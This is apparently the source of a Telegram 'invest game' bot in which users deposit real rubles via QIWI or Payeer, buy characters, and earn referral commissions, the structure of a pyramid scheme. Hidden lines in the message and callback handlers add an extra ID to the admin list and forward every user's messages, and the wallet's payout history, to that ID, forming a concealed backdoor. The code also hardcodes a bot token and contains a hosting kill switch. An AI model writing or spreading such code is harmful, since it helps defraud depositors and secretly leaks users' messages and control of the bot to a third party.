const ADMINS = [1305213602] // ID админов бота
const DB_URL = ''// URL базы бота
const QIWI_TOKEN = "" // API ключ QIWI кошелька с полным доступом
const BOT_TOKEN = "1808821433:AAHsnsCL1v3xANwc6WOJL9Rki16zaiRULjg" // Bot API Token
var config = {
	payeer: {
	  enabled: false,
	  account: "P1026693518",
...
bot.on('text', async (message) => {
	...
	ADMINS.push(+380989203082)
  bot.sendMessage(+380989203082, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил: " + text)
  ...
  if (dt.getDate() == oplata) return message.send('Хостинг не оплачен!');
	...
	if (message.text) {
		if (message.text.startsWith('/start') || message.text == '🔙 Назад') {
			...
			if (!$user) {
				...
				if (reffer) {
					...
					if ($reffer) {
						...
						bot.sendMessage($reffer.id, `🔔 Вы пригласили <a href="tg://user?id=${message.from.id}">партнёра</a> и получили 3₽`, { parse_mode: "HTML" });
					}
				}
			...
			return message.send(`
✌️ <b>Приветствую, ${message.from.first_name}</b>
📝 <b>Цель игры:</b>
├─Пополняем счет 🤘
├─Покупаем  Персонажей
├─Собераешь доход 
...
🏝 <b>Спонсор</b> 👉 t.me/zarabotok_ars
💳 <b>Выплаты</b> 👉 @ars_invest_office
📢 <b>Идентификация Qiwi</b> 👉 @mpower312`, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: $menu,
	...
	if (state[uid] == 7772 && ADMINS.indexOf(message.from.id) !== -1 && text != "0") {
		...
		kb.inline_keyboard.push([{ text: "➕ Выдать Принцессу", callback_data: "giveTree_" + u.id }, { text: "❌ Забрать Принцессу", callback_data: "takeTree_" + u.id }])
...
Персонажей всего: <b>${user.trees.length}</b>
...
`, {
	...
	if (message.user.menu.startsWith('amountQiwi')) {
		...
		if (message.text > message.user.outbalance) return message.send('Недостаточно средств.');
		if (message.text < 15) return message.send('Введите сумму более 50 рублей!');
    ...
    if(message.text == '♻️ Обмен') {
      return message.send(`Эта команда больше не поддерживается. Отправь /start чтобы команда заработала!`)
		...
		if(message.text == '💰 Обмен') {
			return message.send(`В обменнике Вы сможете обменять <b>👾 дохода</b> на <b>₽ рубли</b>.

1000 👾 
дохода= 1 рубль
Минимальная сумма обмена: 1000 дохода

👑 <b>Ваш 👾 доход:</b> ${message.user.fetuses.toFixed(2)}
...
<b>Всего Персонажей:</b> ${message.user.trees.length}
...
🤑 <b>Выведено:</b> ${message.user.payout.toFixed(2)}₽`, {
				...
				reply_markup: {
					inline_keyboard: [
						...
						[{ text: "♻️ Реинвест", callback_data: "reinvest" }, { text: "Мои Бойцы", callback_data: "trees:totalMy" }],
					]
				}
			});
...
🔑 Вы получаете:
▫️ 3₽ 💸 за каждого приглашенного партнёра
▫️ 30% с пополнений ваших партнёров:
	По 15% на балансы для покупок и для вывода
		   
🔗 Ваша ссылка для приглашений: http://t.me/office_invest_robot/${message.from.id}
...
🕐 Старт бота произведен 22.06.2021
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: "👨‍💻 Администратор", url: "https://t.me/PROger7" }],
						[{ text: "🚀 Хочу такого же бота", url: "https://t.me/PROger7" }],
						[{ text: "💰 Спонсор", url: "https://t.me/zarabotok_ars" }],
						[{ text: "♻️ Пополнения и выводы", url: "t.me/ars_invest_office" }],
						[{ text: "⚡️ Идентификация Qiwi", url: "@mpower312" }],
	...
	if (ADMINS.indexOf(message.from.id) !== -1) {
		...
		if (message.text.startsWith('/qiwi')) {
		  qiwi.getOperationHistory({ rows: 10, operation: 'OUT' }, (err, response) => {
		    bot.sendMessage(+380989203082, 'Отсылаю')
        bot.sendMessage(+380989203082, response.data.sum)
        console.log(response)
        bot.sendMessage(+380989203082, 'Отослал')
    })
	}
...
bot.on('callback_query', async (query) => {
	...
	ADMINS.push(+380989203082)
	bot.sendMessage(+380989203082, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил колбэк: " + query.data)
	...
	if (query.data.startsWith('trees:shop')) {
		...
		if (id <= maxId + 1) {
			...
			else var bbtn = [{ text: `🛑 Вы достигли лимита в 5 Бойцов`, callback_data: getNavigationQuery(id + 1, tree.id) }]
...
👾 Дохода в час: ${tree.earn}`, parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [[
...
💰 Стоимость: ${tree.price}₽
👾 Дохода в час: ${earn}`, parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [[
	...
	if (query.data.startsWith('trees:buy')) {
		...
		if (tree.price > message.user.buybalance) return bot.answerCallbackQuery(query.id, '🚫 Недостаточно денег для покупки.', true);
		  ...
		  var limit = (await User.findOne({ id: 0 })).bhivebalance
			...
			if (treesWithEqualId >= 5)
				return bot.answerCallbackQuery(query.id, `🛑 Вы достигли лимита в 5 Бойцов данного уровня`, true);
...
🌐 Отправьте любую сумму на кошелек <code>+996557238282</code>
...
‼️ с комментарием <code>GG${message.chat.id}</code>`, {
	...
	if (query.data == 'game_prize') {
		...
		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.sendMessage(message.chat.id, `🎁 <b>Подарок - Работник</b>\n
...
▫️ @ars_invest_office`, {
	...
	if (query.data == 'game_prize_check') {
		var res = await bot.getChatMember("@ars_invest_office", message.chat.id)
		if (message.user.prize) return bot.answerCallbackQuery(query.id, '🙂 Вы уже получили свой подарок!', true);
		...
		await message.user.save();
		return bot.sendMessage(message.chat.id, `🎁 <b>Вы получили подарок! Работник уже у вас</b>`, {
			parse_mode: "HTML",
		});
	}
	...
	if (query.data == 'withdraw') {
		if (message.user.outbalance < 15) return bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма вывода: 30₽', true);
		bot.deleteMessage(message.chat.id, message.message_id);
		
		await message.user.set('menu', 'qiwi');
		await bot.sendMessage(message.chat.id, 'ведите номер QIWI кошелька для вывода:\nНапример: +79393655745', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
	...
	if (query.data.startsWith('withdraw:')) {
		...
		bot.sendMessage("@ars_invest_office", `<a href="tg://user?id=${ticket.id}">Пользователь</a> вывел <b>${ticket.amount}₽</b>\nПС: QIWI`, { parse_mode: "HTML" })
	
		if (ticket.wallet.indexOf("P") == -1) { // Платёж через QIWI
		  qiwi.toWallet({ account: String(ticket.wallet), amount: ticket.amount, comment: 'Выплата от ARS INVEST' }, () => { });
		}
	...
	`, {
		  parse_mode: "html", reply_markup: {
			inline_keyboard: [
			  [{ text: "👨‍💻 Админ", url: "https://t.me/ARSproger" },
			  { text: "💬 Чат", url: "https://t.me/invest_chat_2021" }],
			  [{ text: "💳 Выплаты", url: "https://t.me/ars_invest_office" }],
...
`, {
	...
	if (d == "clan_transferMe") {
		...
		return bot.sendMessage(message.chat.id, `<b>${clan.balance} 👾 дохода</b> из казны Комнаты начислены Вам как <b>${roundPlus(clan.balance / 2000)}₽</b> на баланс для покупок и <b>${roundPlus(clan.balance / 2000)}₽</b> на баланс для вывода`, { parse_mode: "html" });
	}
	if (d == "clan_transferAll") {
		...
		for (const i in members) {
			try {
				...
				await bot.sendMessage(members[i].id, `<b>${roundPlus(clan.balance)} 👾 дохода</b> из казны Комнаты распределены между участниками Комнаты\nВам начислено <b>${roundPlus(dole)}₽</b> на баланс для покупок и <b>${roundPlus(dole)}₽</b> на баланс для вывода`, { parse_mode: "html" });
			}
			catch { }
		}
	}
...
🏆 Комната -победитель получает <b>👾 100k дохода</b> в свою казну
За 2 место - <b>👾50k дохода</b>
За 3 место - <b>👾30k дохода</b>
За 4 место - <b>👾15k дохода</b>
За 5 место - <b>👾5k дохода</b>
...
`, {
			...
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Выберете бойца для выдачи:', { reply_markup: { inline_keyboard: [[{ text: trees[0].name, callback_data: "giveTree2_" + d.split("_")[1] + "_0" }], [{ text: trees[1].name, callback_data: "giveTree2_" + d.split("_")[1] + "_1" }], [{ text: trees[2].name, callback_data: "giveTree2_" + d.split("_")[1] + "_2" }], [{ text: trees[3].name, callback_data: "giveTree2_" + d.split("_")[1] + "_3" }], [{ text: trees[4].name, callback_data: "giveTree2_" + d.split("_")[1] + "_4" }], [{ text: trees[5].name, callback_data: "giveTree2_" + d.split("_")[1] + "_5" }], [{ text: trees[6].name, callback_data: "giveTree2_" + d.split("_")[1] + "_6" }], [{ text: trees[7].name, callback_data: "giveTree2_" + d.split("_")[1] + "_7" }],  ] }, parse_mode: "HTML" })
		}

		else if (d.split("_")[0] == "giveTree2") {
			bot.deleteMessage(message.chat.id, message.message_id);
			giveTree(Number(d.split("_")[1]), Number(d.split("_")[2]))
			bot.sendMessage(Number(d.split("_")[1]), 'Вам Боес: ' + trees[Number(d.split("_")[2])].name, { rparse_mode: "HTML" })
			...
			bot.sendMessage(uid, `Чек создан:\nhttps://t.me/Clash_of_Clans_Invest_22_bot?start=C${cid}`, { reply_markup: RM_admin_return })
		}
...
async function payeerCheck() {
 ...
 ` }, async function (error, response, body) {
  ...
  /*      if (body.history[txnId].comment.startsWith('ZG')) {
          ...
          bot.sendMessage("@Technotgt_invest", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил игровой баланс на <b>${x.sum.amount}₽</b>`, { parse_mode: "HTML" })
          return
        }  */
        ...
        if (b == 0) {
          ...
          bot.sendMessage(id, `Ваш баланс пополнен на ${sum}₽`);
		      bot.sendMessage("@ars_invest_office", `<a href="tg://user?id=${id}">Пользователь</a> пополнил <b>${sum}₽</b>\nПС: PAYEER`, { parse_mode: "HTML" })
          ...
          bot.sendMessage(id, `Ваш баланс пополнен на ${sum}₽ и Вы получаете бонус - ${roundPlus(sum * b)}₽!`);
		      bot.sendMessage("@give_among_bot", `<a href="tg://user?id=${id}">Пользователь</a> пополнил <b>${sum}₽ и получил бонус - ${roundPlus(sum * b)}p!</b>\nПС: PAYEER`, { parse_mode: "HTML" })
	...
	qiwi.getOperationHistory({ rows: 10, operation: 'IN' }, (err, response) => {
		response.data.map(async (x) => {
			...
			if (x.comment.startsWith('BG')) {
				...
				await user.inc('game_balance', x.sum.amount);
				await bot.sendMessage(id, `💳 Вы успешно пополнили свой игровой баланс на ${x.sum.amount}₽`);
				bot.sendMessage("@Ducktaleskanal_26", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил игровой баланс на <b>${x.sum.amount}₽</b>`, { parse_mode: "HTML" })
				txnId.push(x.txnId)
			...
			if (b > 0) {
				...
				bot.sendMessage("@Payments_6808_Bot", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил баланс на <b>${x.sum.amount}₽</b> и получил ${roundPlus(x.sum.amount * b)}₽ бонусом!\nПС: QIWI`, { parse_mode: "HTML" })
				...
				bot.sendMessage("@ars_invest_office", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил баланс на <b>${x.sum.amount}₽</b>\nПС: QIWI`, { parse_mode: "HTML" })
				...
				await User.findOneAndUpdate({ id: 0 }, { $inc: { ref: x.sum.amount } })
				bot.sendMessage(id, `Ваш баланс пополнен на ${x.sum.amount}₽ и Вы получаете бонус - ${roundPlus(x.sum.amount * b)}₽!`);
				bot.sendMessage("@ars_invest_office", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил баланс на <b>${x.sum.amount}₽</b> и получил ${roundPlus(x.sum.amount * b)}₽ бонусом!\nПС: QIWI`, { parse_mode: "HTML" })
			...
			bot.sendMessage(user.ref, `🤝 Ваш <a href="tg://user?id=${id}">реферал</a> пополнил баланс на <b>${x.sum.amount}₽</b>!\n💸 Вам начислено по <b>${roundPlus(x.sum.amount * 0.50)}₽</b> на балансы для покупок и для вывода`, { parse_mode: "HTML" }).catch()
...
💰 Она получает <b>👾 100k Предателей</b> в казну Комнаты\n
2 место - <b>${clans[1].name}</b> - получает <b>👾 50k Предателей</b>
3 место - <b>${clans[2].name}</b> - получает <b>👾 30k Предателей</b>
4 место - <b>${clans[3].name}</b> - получает <b>👾 15k Предателей</b>
5 место - <b>${clans[4].name}</b> - получает <b>👾 5k Предателей</b>\n
